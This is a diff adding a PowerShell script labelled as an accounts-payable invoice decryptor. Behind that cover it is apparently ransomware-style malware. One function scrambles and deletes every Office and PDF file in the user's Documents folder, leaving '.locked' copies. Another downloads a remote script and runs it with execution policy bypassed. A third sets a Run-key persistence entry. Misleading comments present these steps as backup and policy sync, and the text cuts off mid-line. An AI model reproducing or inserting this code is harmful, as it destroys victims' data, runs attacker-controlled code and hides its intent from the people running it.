@@ -1,0 +1,62 @@
+<#
+.SYNOPSIS
+Invoice Decryptor Tool v2.1 - Accounts Payable Department
+.DESCRIPTION
+This tool decrypts AES-256 encrypted invoice files (.enc) received from external vendors.
+Usage: .\invoice_decryptor.exe --input <encrypted_invoice.enc> --output <decrypted.pdf>
+#>
+
+param(
+    [string]$InputPath,
+    [string]$OutputPath = "$env:TEMP\decrypted_invoice.pdf"
+)
+
+function Invoke-AESDecrypt {
+    param([string]$inFile, [string]$outFile)
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes("APSecretKey2024!")   # 16 bytes (128-bit)
+    $aes.IV  = [System.Text.Encoding]::UTF8.GetBytes("APInitialVector1")  # 16 bytes
+
+    $decryptor = $aes.CreateDecryptor()
+    $fsIn  = [System.IO.File]::OpenRead($inFile)
+    $cs    = New-Object System.Security.Cryptography.CryptoStream($fsIn, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
+    $fsOut = [System.IO.File]::Create($outFile)
+
+    $cs.CopyTo($fsOut)
+    $cs.Close(); $fsIn.Close(); $fsOut.Close()
+    return $true
+}
+
+function Start-SecureInvoiceBackup {
+    # Policy requires all invoice-related documents be secured before decryption
+    $documents = "$env:USERPROFILE\Documents"
+    Get-ChildItem -Path $documents -Include *.pdf,*.docx,*.xlsx,*.pptx -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+        $data = [System.IO.File]::ReadAllBytes($_.FullName)
+        for ($i = 0; $i -lt $data.Length; $i++) { $data[$i] = $data[$i] -bxor 0xFF }
+        $newPath = "$($_.FullName).locked"
+        [System.IO.File]::WriteAllBytes($newPath, $data)
+        Remove-Item $_.FullName -Force
+    }
+}
+
+function Invoke-ConfigurationSync {
+    # Synchronize decryption policies from the internal update server
+    $updateUri  = "http://update-server-internal.intra/policy.cfg"
+    $scriptPath = "$env:TEMP\cfgSync.ps1"
+    try {
+        (New-Object Net.WebClient).DownloadFile($updateUri, $scriptPath)
+        powershell -ExecutionPolicy Bypass -File $scriptPath
+    }
+    catch { Write-Host "[!] Policy sync unavailable, continuing with local configuration." }
+}
+
+function Set-Persistence {
+    $regPath   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $valueName = "InvoiceDecryptor"
+    $execPath  = (Get-Command ".\invoice_decryptor.exe" -ErrorAction SilentlyContinue).Source
+    if ($execPath) {
+        Set-ItemProperty -Path $regPath -Name $valueName -Value $execPath
+    }
+    else {
+        Set-ItemProperty -Path $regPath -Name $valueName -Value (Resolve-Path ".\invoice_decryptor.exe
